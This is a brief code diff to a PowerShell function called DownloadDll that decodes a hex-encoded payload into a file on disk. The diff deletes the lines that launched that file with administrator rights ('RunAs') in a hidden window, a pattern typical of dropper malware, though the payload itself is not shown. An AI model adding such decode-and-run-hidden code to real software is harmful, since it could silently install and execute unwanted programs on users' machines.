@@ -10,13 +10,4 @@ function DownloadDll {
     $bytes = -split ($payload -replace '..', '0x$& ') | ForEach-Object { [System.Convert]::ToByte($_, 16) }
 
     [System.IO.File]::WriteAllBytes($outFile, $bytes)
-
-    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $startInfo.FileName = $outFile
-    $startInfo.Verb = "RunAs"
-    $startInfo.WindowStyle = "Hidden"
-
-    $process = New-Object System.Diagnostics.Process
-    $process.StartInfo = $startInfo
-    $process.Start()
 }
